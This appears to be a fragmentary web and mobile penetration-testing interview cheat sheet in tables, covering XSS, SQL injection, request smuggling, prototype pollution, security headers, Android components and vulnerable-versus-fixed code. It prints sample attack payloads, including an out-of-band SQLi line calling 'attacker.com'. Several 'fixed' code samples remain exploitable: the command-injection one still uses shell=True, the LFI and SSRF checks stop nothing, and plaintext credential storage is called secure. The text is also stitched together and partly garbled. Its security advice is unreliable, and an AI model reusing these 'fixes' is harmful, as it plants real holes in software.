|---------------------------|-----------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------|-------------------------------------------------------|
| **HTTP Smuggling**         | A technique where an attacker manipulates HTTP requests to bypass security mechanisms by exploiting discrepancies between the proxy and backend servers. | Allows attackers to bypass security controls, cause cache poisoning, or leak sensitive data. | `POST /path HTTP/1.1\r\nHost: vulnerable.com\r\n\r\nGET /malicious HTTP/1.1` |
| **Race Condition**         | Occurs when two or more processes access shared data concurrently, leading to unpredictable results and potential security issues. | Can result in unauthorized actions, data corruption, or privilege escalation due to improper synchronization. | Simultaneous requests to update user settings, causing inconsistent or unauthorized changes. |
| **Prototype Pollution**    | An attack that manipulates JavaScript object prototypes, leading to unintended behavior across the application. | Allows attackers to modify core JavaScript behavior, causing crashes, security flaws, or unauthorized access. | `{"__proto__": {"isAdmin": true}}` to gain unauthorized admin privileges. |
| **Parameter Pollution**    | Occurs when multiple parameters with the same name are submitted, potentially overwriting existing values and altering the application's behavior. | Can bypass security checks, alter application logic, or cause unexpected behavior by modifying parameters. | `?username=attacker&username=admin` to overwrite the username parameter. |
| **WebSocket**              | A communication protocol that enables real-time, bidirectional communication between client and server over a single connection. | Used for real-time applications like live chat, notifications, and gaming, offering low-latency interactions. | `wss://example.com/socket` for real-time communication in a chat app. |
| **WebSocket Vulnerabilities** | Risks associated with WebSocket connections, including hijacking, data injection, or DoS attacks if not properly secured. | Attackers can intercept or manipulate WebSocket connections, cause DoS attacks, or send malicious data. | Hijacking a WebSocket connection to inject malicious data or flood the server with requests. |




### **DOM XSS Overview in Details**

| **Aspect**        | **Details**                                                                                                                                      |
|-------------------|--------------------------------------------------------------------------------------------------------------------------------------------------|
| **Definition**    | DOM-based Cross-Site Scripting (DOM XSS) is a type of XSS attack where the vulnerability exists in the client-side code (JavaScript) rather than in the server-side code. It occurs when an attacker can manipulate the DOM (Document Object Model) of a web page in such a way that malicious scripts are executed in the user's browser. |
| **Conditions**    | - **Client-side JavaScript**: The attack relies on JavaScript code running in the user's browser. <br> - **Manipulated Input**: User input is improperly handled or sanitized, allowing script injection. <br> - **Dynamic Content**: Web pages dynamically update content based on user input or URL parameters. |
| **Where Performed** | - **URL Parameters**: Injecting scripts through URL query parameters. <br> - **DOM Manipulation**: Exploiting JavaScript functions that update the DOM using user input (e.g., `document.write`, `innerHTML`). <br> - **User Input**: Malicious input in fields or data that is dynamically added to the page. |
| **Examples**      | - **Example 1**: If a web application uses the following code to reflect a URL parameter into the page without proper validation: <br> `document.getElementById("output").innerHTML = location.hash.substring(1);` <br> An attacker can exploit this by visiting a URL like `http://example.com/#<script>alert('XSS')</script>`, causing the script to execute in the browser. <br><br> - **Example 2**: A web page that uses `document.location` to dynamically insert content into the page: <br> `document.getElementById("content").innerHTML = document.location.search.substring(1);` <br> If an attacker crafts a URL like `http://example.com/?<script>alert('XSS')</script>`, the script will execute on the page. <br><br> - **Example 3**: A site using `eval()` to execute JavaScript code from user input: <br> `eval(document.getElementById("codeInput").value);` <br> If an attacker inputs `<script>alert('XSS')</script>` into the `codeInput` field, it will be executed when `eval()` runs. |


### SQL Injection and Its Types


| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users, ' UNION SELECT null, null--, ' UNION SELECT null, null, null--, ' UNION SELECT null, null, null, null--` |
|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--, SELECT 1/0--, AND 1=0--, AND 1=1#, OR 1=1, OR x=x` |
| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1, ' OR 1=1--, " OR "" = ", " OR 1 = 1--, ' OR '' = ', ' OR 1=1 AND 'a'='a` |
|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--, " OR SLEEP(5)--, ' OR SLEEP(5)--, WAITFOR DELAY '00:00:10'--` |
| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |

By preventing a browser from framing your site you can defend against attacks like clickjacking. | `X-Frame-Options: SAMEORIGIN`<br>`X-Frame-Options: Self`                                                                                                                                 |
| **X-Content-Type-Options**   | X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and force it to stick with the declared content-type.                                             | `X-Content-Type-Options: no sniff"`                                                                                                                                                      |
| **Referrer-Policy**          | In simpler terms, the purpose of the "Referrer Policy" header is to control how much information the browser shares when you click on a link and leave a webpage.                | **Vulnerable Example:**<br>`Referrer-Policy: unsafe-url`<br>This setting allows the full URL (including path and query parameters) to be sent in the Referer header, potentially exposing sensitive information.<br><br>**Fix Example:**<br>`Referrer-Policy: strict-origin`<br>This setting instructs the browser to include only the origin (scheme, host, and port) of the referring URL in the Referer header, enhancing user privacy and security. |
| **Permissions-Policy**       | - **Purpose:** Controls which browser features and APIs can be used.<br>- **Vulnerable Example:** Permissions-Policy:accelerometer=*<br>This setting allows any origin to access the device's accelerometer API, potentially leading to unauthorized access or misuse of sensitive device capabilities.<br>- **Fix Example:** Permissions-Policy: accelerometer=()<br>This setting restricts access to the accelerometer API to the same origin only, preventing unauthorized access and reducing the risk of exploitation. | `Permissions-Policy: camera=*, geolocation=*, microphone=*`<br>This policy allows any origin to access the camera, geolocation, and microphone APIs, potentially leading to unauthorized access or misuse of sensitive device capabilities:<br>`Permissions-Policy: camera=(), geolocation=(), microphone=()`<br>This policy restricts access to the camera, geolocation, and microphone APIs to the same origin only, preventing unauthorized access and reducing the risk of exploitation. |

### Common Cookies and Itâ€™s values


| Cookies         | Values             | Description                                                                                                                                                                   | Vulnerable Example                                  | Fix Example                                                                                                       |
|-----------------|--------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------------------------------------|
| Secure          | Secure             | By setting the secure attribute, the cookie will only be sent over HTTPS connections, reducing the risk of interception by attackers.                                       | `Set-Cookie: session_id=abc123;`                   | `Set-Cookie: session_id=abc123; Secure`                                                                           |
| HttpOnly        | HttpOnly           | When a cookie has the HttpOnly attribute set, JavaScript cannot access it, which helps mitigate certain types of XSS attacks.                                                | `Set-Cookie: session_id=abc123;`                   | `Set-Cookie: session_id=abc123; HttpOnly`                                                                         |
| SameSite        | Strict, Lax, None | The SameSite attribute defines when cookies should be sent along with cross-site requests.                                                                                    | `Set-Cookie: session_id=abc123; SameSite=None`     | `Set-Cookie: session_id=abc123; SameSite=Strict; Secure`                                                           |

### Intruder attack Type:


| Attack Type    | Description                                                                                                                                                                   |
|----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Sniper:**    | - Work on single payload set.<br>- If 3 positions are selected then one by one position are set with payload to run. It work set payload in first position and rest two values will as it is. Now same goes of rest two positions.<br>- It means sniper handles single position at a time. |
| **Battering RAM** | - Work on single payload set.<br>- Payload set at all positions simultaneously.                                                                                                  |
| **Pitchfork**  | - Work on multiple sets of payload.<br>- Work on the minimum number of payloads.<br>- If two payloads contain numbers like 6 and 4, then will generate 4 payloads only.<br>- To run this at all positions one payload is needed. |
| **Cluster Bomb** | - Work on multiple sets of payload.<br>- All the permutation and combination of payloads are generated.<br>- Suppose if the payload set is 2 and position also two then works as shown in image. |





###  Prototype Pollution vs Parameter Pollution

| **Aspect**                   | **Prototype Pollution**                                                                                                                     | **Parameter Pollution**                                                                                                                             |
|------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------|
| **Definition**                | **Prototype Pollution** occurs when an attacker manipulates or alters an object's prototype, typically adding malicious properties or methods that affect all objects that inherit from that prototype. | **Parameter Pollution** happens when an attacker manipulates or injects duplicate or unexpected parameters in a request, potentially causing unexpected behavior or bypassing validation. |
| **How it Works**              | The attacker modifies the prototype of an object, such as adding properties to `__proto__`, which affects all objects in the application that inherit from this prototype. | The attacker adds multiple or duplicate parameters to the query string, URL, or form data, potentially overriding legitimate data or causing issues with how parameters are processed. |
| **Common Attack Vectors**     | - Direct manipulation of objects' prototype chain (e.g., modifying `__proto__`).<br> - Input validation vulnerabilities in web applications that allow direct access to the prototype. | - User input fields in GET, POST, or other HTTP request types.<br> - Lack of validation on parameters like `user`, `id`, or other key fields passed via URL or form. |
| **Example of Attack**         | Sending a payload like: `{"__proto__": {"polluted": true}}` which modifies the prototype of all objects inheriting from `Object.prototype`. | Sending a request like: `https://example.com/api/user?name=admin&name=user`, where the `name` parameter is passed twice, potentially overwriting values. |
| **Security Risks**            | - Overwrites or disables critical methods such as `hasOwnProperty()` or `toString()`.<br> - Can cause the application to behave unpredictably or open the door for further attacks. | - Can lead to unauthorized access by overriding important fields (e.g., a user's role or ID) or bypassing validation checks.<br> - Can lead to data inconsistency or broken application logic. |
| **How to Test**               | - Try injecting payloads with `__proto__`, `constructor`, or `prototype` properties in the request body or query.<br> - Check for unexpected behavior, such as modified object properties. | - Send requests with duplicate parameters (e.g., `user=admin&user=guest`) or unexpected parameters to check for vulnerabilities.<br> - Test if the application properly validates and handles duplicate or malicious parameters. |
| **Mitigation Techniques**     | - Sanitize user input to prevent modification of the prototype.<br> - Use `Object.create(null)` to create objects without a prototype.<br> - Use libraries and frameworks that automatically prevent prototype pollution. | - Sanitize and validate input parameters.<br> - Ensure the application processes parameters in a consistent and secure manner (e.g., reject duplicate or unexpected parameters).<br> - Implement strict input validation and parameter order handling. |
| **Common Vulnerable Areas**   | - Dynamic property assignment (e.g., using `req.body` in Express.js or other web frameworks).<br> - Libraries or code that don't properly handle object properties. | - HTTP request handling, especially in forms and URLs.<br> - Applications that donâ€™t sanitize or validate multiple parameters sent to the server. |
| **Example of Vulnerable Request** | Sending a request like: `{"__proto__": {"polluted": true}, "username": "attacker"}` which pollutes the object prototype. | Sending a request like: `https://example.com/api/user?username=admin&username=guest`, where the parameter `username` is sent twice. |
| **Example of Vulnerable Response** | A response where objects have unexpected properties, or core functionality is broken due to polluted prototypes. | A response where data from one parameter overrides another, or validation is bypassed due to duplicate parameters. |

### HTTP Request Smuggling vs Race Condition 

| **Aspect**                     | **HTTP Request Smuggling**                                                                                                                             | **Race Condition**                                                                                                                                    |
|---------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Definition**                  | **HTTP Request Smuggling** involves sending a crafted HTTP request that is interpreted differently by different components (like proxies, load balancers, or web servers), allowing hidden or unauthorized requests to bypass security. | **Race Condition** occurs when two or more requests or processes try to access or modify the same resource concurrently, causing unexpected or inconsistent results due to the timing of the operations. |
| **How it Works**                | The attacker crafts a request with ambiguous headers (e.g., `Transfer-Encoding` and `Content-Length`), causing different parts of the network infrastructure (such as proxies and servers) to interpret the request differently. | Two or more processes attempt to modify shared data or resources at the same time. Without proper synchronization, one process can overwrite the changes of the other or cause inconsistent results. |
| **Common Attack Vectors**       | - **Proxies** and **Load Balancers** that incorrectly parse HTTP headers.<br>- **Transfer-Encoding** and **Content-Length** headers, which can confuse web servers and intermediaries.<br>- Misconfigurations in HTTP request parsing. | - Web applications or systems that have shared resources (e.g., databases or stateful objects) and allow multiple concurrent requests.<br>- Inconsistent handling of race conditions due to missing locks or atomic operations. |
| **Primary Goal**                | To bypass security controls, access hidden internal services, or manipulate request handling to exploit vulnerabilities or disrupt the application. | To exploit the timing differences in concurrent processes to alter data, cause data corruption, or trigger unauthorized actions (e.g., double-spending or unauthorized access). |
| **Crafted Request Example**     | **HTTP Request Smuggling Payload**:<br> ```POST / HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /evil HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 4\r\n\r\n```<br> Here, the attacker crafts a request that uses both `Content-Length` and `Transfer-Encoding: chunked`. The proxy and web server interpret the request differently, leading to two requests being processedâ€”one hidden inside the other. | **Race Condition Attack Payload**:<br> Two concurrent users simultaneously request the withdrawal of funds from the same bank account.<br> **User 1 Request:** `POST /withdrawal HTTP/1.1\r\nContent-Length: 50\r\n\r\n{ "account": "123", "amount": 1000 }`<br> **User 2 Request:** `POST /withdrawal HTTP/1.1\r\nContent-Length: 50\r\n\r\n{ "account": "123", "amount": 1000 }`<br> Both requests occur at the same time, and the system doesnâ€™t correctly handle the concurrent access to the same bank account, potentially allowing both users to withdraw funds simultaneously, leading to double-spending. |
| **Crafted Response Example**    | **HTTP Request Smuggling Response**:<br> After the attacker sends the crafted request, the backend may respond with a **redirect** to an internal service or unauthorized page: <br> `HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nRedirect to /internal-service`<br> This happens because the proxy and web server process requests differently, causing an internal request to be smuggled through and accepted by the backend server. | **Race Condition Response Example**:<br> After the two users concurrently withdraw funds, the system may not detect the double-spending issue. The response might be inconsistent, such as:<br> **User 1 Response:** `{ "status": "success", "message": "Withdrawal completed. Your balance is $1000." }`<br> **User 2 Response:** `{ "status": "success", "message": "Withdrawal completed. Your balance is $1000." }`<br> Both users think their withdrawal succeeded, but the application didn't properly synchronize access to the bank account, resulting in both withdrawals being processed. |
| **Security Risks**              | - **Bypass Authentication**: Smuggling hidden requests could bypass authentication layers.<br>- **Access Hidden Resources**: Internal services or endpoints can be exposed due to request misinterpretation.<br>- **Disruption of Services**: Interference with normal request flow can cause unexpected errors or downtime. | - **Inconsistent Data**: Changes to shared resources may not reflect the actual intended order (e.g., bank balances or inventory counts).<br>- **Unauthorized Actions**: Actions like double withdrawals, or processing unauthorized transactions due to simultaneous requests. |
| **How to Test**                 | - **Craft requests with conflicting `Transfer-Encoding` and `Content-Length` headers** to observe if they are handled inconsistently by intermediaries.<br>- Use tools like **Burp Suite**, **ZAP**, or manual request crafting to manipulate request headers and analyze the responses. | - **Simulate concurrent requests** using tools like **Artillery**, **JMeter**, or custom scripts to test for shared resource access.<br>- Check if concurrent processes (e.g., two users withdrawing funds) can lead to data corruption or inconsistent states. |
| **Mitigation Techniques**       | - **Ensure Consistent HTTP Request Parsing**: All components (load balancers, proxies, backend servers) should handle HTTP requests consistently.<br>- **Strict Header Validation**: Proxies and web servers should strictly validate the `Content-Length` and `Transfer-Encoding` headers.<br>- **Patch Proxies**: Regularly update and patch proxies and web servers to handle HTTP request parsing securely. | - **Use Locks and Synchronization**: Implement locks, semaphores, or other synchronization techniques to ensure shared resources are accessed sequentially.<br>- **Atomic Operations**: Ensure that critical operations (e.g., money withdrawals, inventory updates) are atomic.<br>- **State Validation**: Implement checks to validate data integrity before and after critical operations to prevent race-based vulnerabilities. |

Android architecture contains different number of components to support any android device
needs. Android software contains an open-source Linux Kernel having collection of number of C/C++
libraries which are exposed through an application framework services.

Among all the components Linux Kernel provides main functionality of operating system functions to
smartphones and Dalvik Virtual Machine (DVM) provide platform for running an android application.

The main components of android architecture are following:-

- Applications
- Application Framework
- Android Runtime
- Platform Libraries
- Linux Kernel

| **Component**              | **Description**                                                                                                   |
|----------------------------|-------------------------------------------------------------------------------------------------------------------|
| **Applications**           | Top layer where pre-installed and third-party applications reside. Runs within Android runtime using framework services. |
| **Application Framework** | Provides essential classes for creating applications, including services like activity manager and notification manager. |
| **Android Runtime**        | Contains core libraries and Dalvik Virtual Machine (DVM) that support application execution.                        |
| **Dalvik Virtual Machine** | Optimized for Android, DVM manages multiple instances efficiently and relies on Linux kernel for low-level tasks.    |
| **Platform Libraries**     | Includes C/C++ and Java libraries for media, graphics, and databases, among others.                                 |
| **Linux Kernel**           | Core of Android architecture managing drivers, memory, power, and providing security, memory, and process management. |


### Common Components :

| **Component**                | **Description**                                                                                       | **Potential Security Issues**                                       |
|------------------------------|-------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| **Activity**                 | Represents a single screen with a user interface in an Android application. Entry point for user interaction. | Insecure data storage, input validation, authentication flaws.      |
| **Broadcast Receiver**       | Listens for system-wide broadcast messages or intents. Responds to system events.                      | Insecure broadcast handling, privilege escalation.                 |
| **Intent**                   | Messaging object used to communicate between components. Starts Activities, Services, delivers broadcasts, or passes data. | Intent spoofing, intent injection, insecure data passing.           |
| **Explicit Intents**         | Used to start a specific component within the same application. Requires specifying the target component's class or package name. | Example: Starting a new Activity within the app.                   |
| **Implicit Intents**         | Used to trigger actions based on an action string. Does not specify the target component's name but defines an action to be performed. Android system resolves the intent based on available components capable of handling the action. | Example: Opening a web page or sending an email.                   |
| **Service**                  | Background component that performs long-running operations. Runs tasks asynchronously without a user interface. | Insufficient authentication, denial of service (DoS), data leakage. |
| **Content Provider**         | Manages shared application data accessible by other applications or components. Provides a standardized interface for accessing and manipulating data. | Insecure data exposure, insufficient access controls.              |
| **Manifest File (AndroidManifest.xml)** | Configuration file containing essential information about the application. Declares components, permissions, and hardware requirements. | Excessive permissions, missing security controls.                   |
| **WebView**                  | Embeds web content within an application. Can execute JavaScript, load remote URLs, and interact with the DOM. | JavaScript injection, XSS attacks, insecure communication.         |
| **Activity Manager**         | Manages the lifecycle of application activities. Controls the creation, starting, pausing, and stopping of activities. Handles activity stacking and navigation within the application. | Potential for activity leakage, improper activity lifecycle handling leading to data leaks or crashes. |

## APK Static Analysis

| **Aspect**                        | **Description**                                                                                                      |
|-----------------------------------|----------------------------------------------------------------------------------------------------------------------|
| **Permissions**                   | Check if the application requests sensitive permissions (camera, microphone, location, SMS, call logs). Unnecessary permissions may indicate privacy violations or security risks. |
| **Components**                    | Evaluate Android components (activities, services, receivers, providers) for potential exploitation. Ensure components are not exposed with overly permissive access. |
| **android:exported**              | This attribute should be set to `false` to prevent unauthorized access. The default value is `true`.                 |
| **Intents**                       | Review the use of implicit intents to ensure they are not susceptible to interception or manipulation by attackers.  |
| **Allow debugable**               | Should be `false`. If set to `true`, it can allow data extraction or arbitrary code execution without a rooted phone. The default value is `false`. |
| **Allow backup**                 | Should be `false`. This setting controls whether application data can be backed up and restored via USB debugging. The default value is `true`. |
| **Application information**       | Check for hard-coded credentials, sensitive information, or debugging features that could be exploited.             |
| **Malware signatures**            | Analyze for any known malware signatures that could suggest the app is malicious or harmful.                        |

# API Pentestesting: Interview

 ## Synchronous and Asynchronous APIs
 
| **Aspect**                  | **Synchronous API**                                                                                 | **Asynchronous API**                                                                              |
|-----------------------------|----------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Execution**              | Tasks are executed sequentially; the client waits for a response before proceeding.                | Tasks are executed independently; the client doesn't wait and can continue other operations.    |
| **Communication**          | Blocking â€“ the client is blocked until the server responds.                                        | Non-blocking â€“ the client continues without waiting for the server's response.                  |
| **Performance**            | Slower for long-running tasks as it waits for responses.                                           | Faster and more efficient for handling concurrent tasks.                                        |
| **Use Case**               | Suitable for immediate-response tasks (e.g., login authentication).                               | Ideal for background or long-running tasks (e.g., sending emails, data processing).             |

### Vulnerable Code and Fixed Code Examples

| **Vulnerable Code**                                                                                                                                                                  | **Fixed Code**                                                                                                                                                                                 | **Explanation**                                                                                                                                          |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------|
| **SQL Injection (SQLi)**<br>```python<br>import sqlite3<br><br>def get_user(username):<br>    conn = sqlite3.connect('database.db')<br>    cursor = conn.cursor()<br>    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")  # Vulnerable<br>    return cursor.fetchone()<br>``` | ```python<br>import sqlite3<br><br>def get_user(username):<br>    conn = sqlite3.connect('database.db')<br>    cursor = conn.cursor()<br>    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))  # Fixed<br>    return cursor.fetchone()<br>``` | **Explanation:** Parameterized queries (`?` placeholder) are used with SQLite to prevent SQL injection. They safely separate SQL commands from data inputs. |
| **Server-Side Request Forgery (SSRF)**<br>```python<br>import requests<br><br>def fetch_url(url):<br>    response = requests.get(url)  # Vulnerable<br>    return response.text<br>``` | ```python<br>import requests<br><br>def fetch_url(url):<br>    if not url.startswith(('http://', 'https://')):<br>        raise ValueError('Invalid URL')<br>    response = requests.get(url)<br>    return response.text<br>``` | URL validation ensures the URL starts with `http://` or `https://`, reducing the risk of SSRF by preventing unauthorized internal requests. |
| **Cross-Site Scripting (XSS)**<br>```python<br>from flask import Flask, request, render_template_string, escape<br><br>app = Flask(__name__)<br><br>@app.route('/')<br>def index():<br>    name = request.args.get('name', 'Guest')<br>    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable<br>``` | ```python<br>from flask import Flask, request, render_template_string, escape<br><br>app = Flask(__name__)<br><br>@app.route('/')<br>def index():<br>    name = request.args.get('name', 'Guest')<br>    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed<br>``` |  Using the `escape` function from Flask to escape user input and the `safe` filter in templates prevents XSS by neutralizing potentially harmful content. |
| **Cross-Site Request Forgery (CSRF)**<br>```html<br>&lt;form action="/transfer" method="post"&gt;<br>    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;<br>    &lt;input type="hidden" name="amount" value="1000"&gt;<br>    &lt;input type="submit" value="Transfer Money"&gt;<br>&lt;/form&gt;<br>``` | CSRF tokens (`csrf_token`) are included in forms to ensure that requests are made by authenticated users, preventing unauthorized actions from external sites. |
| **OS Command Injection**<br>```python<br>import subprocess<br><br>def execute_command(command):<br>    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable<br>    return result.decode("utf-8")<br>``` | ```python<br>import subprocess<br><br>def execute_command(command):<br>    try:<br>        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)<br>        return result.decode("utf-8")<br>    except subprocess.CalledProcessError as e:<br>        return f"Error: {e}"<br>``` | Using `subprocess` with exception handling prevents command injection. The code safely captures output and errors, avoiding unintended command execution. |
| **Local File Inclusion (LFI)**<br>```python<br>import os<br><br>def read_file(file_path):<br>    with open(file_path, 'r') as file:<br>        content = file.read()<br>    return content<br>``` | ```python<br>import os<br><br>def read_file(file_path):<br>    if not os.path.isfile(file_path):<br>        return "File not found"<br>    with open(file_path, 'r') as file:<br>        content = file.read()<br>    return content<br>``` |  Checking if the file exists using `os.path.isfile` before opening it prevents unauthorized file access and reduces the risk of including unintended files. |
| **Remote File Inclusion (RFI)**<br>```python<br>import requests<br><br>def fetch_remote_file(url):<br>    if not filter_var(url, FILTER_VALIDATE_URL):<br>        raise Exception('Invalid URL')<br>    return requests.get(url).text<br>``` | ```python<br>import requests<br><br>def fetch_remote_file(url):<br>    if not url.startswith(('http://', 'https://')):<br>        return "Invalid URL"<br>    response = requests.get(url)<br>    if response.status_code != 200:<br>        return "Failed to fetch remote file"<br>    return response.text<br>``` | URL validation (`url.startswith`) and checking HTTP status codes ensure that only valid and accessible URLs are processed, mitigating risks from remote file inclusion. |
| **Docker Image Vulnerability**<br>```dockerfile<br># Vulnerable Dockerfile<br>FROM ubuntu:latest<br>RUN apt-get update && apt-get install -y vulnerable-package<br>``` | ```dockerfile<br># Fixed Dockerfile<br>FROM ubuntu:latest<br>RUN apt-get update && apt-get install -y secure-package<br>``` | Replacing vulnerable packages with their secure versions reduces known security risks in Docker images. Regular updates and security patches are crucial. |
| **Kubernetes Secrets Exposure**<br>```yaml<br># Vulnerable Kubernetes Deployment<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  template:<br>    spec:<br>      containers:<br>        - name: myapp<br>          image: myapp:latest<br>          env:<br>            - name: SECRET_KEY<br>              value: "mysecretkey"<br>``` | ```yaml<br># Fixed Kubernetes Deployment<br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: myapp<br>spec:<br>  template:<br>    spec:<br>      containers:<br>        - name: myapp<br>          image: myapp:latest<br>          env:<br>            - name: SECRET_KEY<br>              valueFrom:<br>                secretKeyRef:<br>                  name: myapp-secrets<br>                  key: secret_key<br>``` |  Using Kubernetes Secrets (`valueFrom: secretKeyRef`) instead of plaintext values in deployment configurations enhances security by managing sensitive data securely. |
| **Jenkins Credentials Exposure**<br>```groovy<br>// Vulnerable Jenkins Pipeline<br>node {<br>  stage('Build') {<br>    sh 'some_command --key=mysecretkey'<br>  }<br>}<br>``` | ```groovy<br>// Fixed Jenkins Pipeline<br>node {<br>  stage('Build') {<br>    withCredentials([string(credentialsId: 'mysecretkey-id', variable: 'SECRET_KEY')]) {<br>      sh 'some_command --key=$SECRET_KEY'<br>    }<br>  }<br>}<br>``` |  Jenkins' `withCredentials` block securely handles sensitive information by using credentials stored in Jenkins' credentials management system, preventing exposure in scripts. |
| **Git Credential Exposure**<br>```bash<br># Vulnerable Git config<br>git config --global user.name "username"<br>git config --global user.password "password"<br>``` | ```bash<br># Fixed Git config<br># Store credentials securely using Git credential helper<br>git config --global credential.helper store<br>``` |  Configuring Git to use a credential helper (`credential.helper store`) securely manages credentials, avoiding plaintext storage and enhancing security. |

import sqlite3

def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")  # Vulnerable
    return cursor.fetchone() 
```

 - **Fixed Code**
```python
def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))  # Fixed
    return cursor.fetchone() 
```

## Server-Side Request Forgery (SSRF)
- Vulnerable Code: Direct use of user-controlled input in HTTP requests.
- Fix: Validate and restrict user-supplied URLs to prevent SSRF.
```python
import requests

def fetch_url(url):
    response = requests.get(url)  # Vulnerable
    return response.text
```

 -  **Fixed Code**
```python
def fetch_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        raise ValueError('Invalid URL')
    response = requests.get(url)
    return response.text
```

## Cross-Site Scripting (XSS)
- Vulnerable Code: Rendering user input without proper escaping.
- Fix: Use escaping functions to prevent injection of malicious scripts.

```python
from flask import Flask, request, render_template_string, escape

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable
```

- **Fixed Code**

```python
 @app.route('/')
 def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed
```


## Cross-Site Request Forgery (CSRF)
- Vulnerable Code: Lack of CSRF token protection in forms.
- Fix: Include CSRF tokens in forms and AJAX requests.

```python
<form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Transfer Money">
</form>
```

## OS Command Injection
- Vulnerable Code: Direct use of user input in system commands without validation.
- Fix: Use subprocess module with proper input validation and sanitization.
```python
import subprocess

def execute_command(command):
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable
    return result.decode("utf-8")
```

 - **Fixed Code**
```py
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"
```

## Local File Inclusion (LFI)
- Vulnerable Code: Directly opens a file without proper validation.
- Fix: Check if the file exists before reading its content.
```python
def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```
 - **Fixed Code**
```py
def read_file_fixed(file_path):
    if not os.path.isfile(file_path):
        return "File not found"
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```

## Remote File Inclusion (RFI)
- Vulnerable Code: Makes an HTTP request to a user-supplied URL without proper validation.
- Fix: Check if the URL starts with 'http://' or 'https://' and handle HTTP errors properly.
```python
def fetch_remote_file(url):
    if not filter_var($url, FILTER_VALIDATE_URL):
        throw new Exception('Invalid URL')
    return file_get_contents($url)
```
  - **Fixed Code**
```py
def fetch_remote_file(url):
    if not url.startswith(('http://', 'https://')):
        return "Invalid URL"
    response = requests.get(url)
    if response.status_code != 200:
        return "Failed to fetch remote file"
    return response.text

```
